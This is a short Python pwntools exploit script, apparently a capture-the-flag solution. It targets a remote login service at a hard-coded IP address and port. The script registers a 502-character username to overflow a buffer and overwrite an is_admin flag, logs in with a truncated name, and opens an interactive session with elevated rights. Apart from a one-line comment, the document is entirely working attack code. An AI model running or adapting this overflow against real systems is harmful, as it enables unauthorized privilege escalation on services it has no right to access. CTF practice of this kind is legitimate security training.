#problem with a buffer flowerflow which could overwrite is_admin

from pwn import *
import string
import random

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

host = "188.166.133.53"
port = 12157

c = remote(host, port)
print c.recv()
c.sendline("1")
print c.recv()
username_known = id_generator(502)
password_known = id_generator()
c.sendline(username_known)
print c.recv()
c.sendline(password_known)
print c.recv()
c.sendline("1")
print c.recv()
c.sendline(username_known[0:10])
print c.recv()
c.sendline(password_known)
print c.recv()
c.sendline("2")
print c.recv()
c.sendline(username_known[0:10])
print c.recv()
c.sendline(password_known)
c.interactive()

c.close()
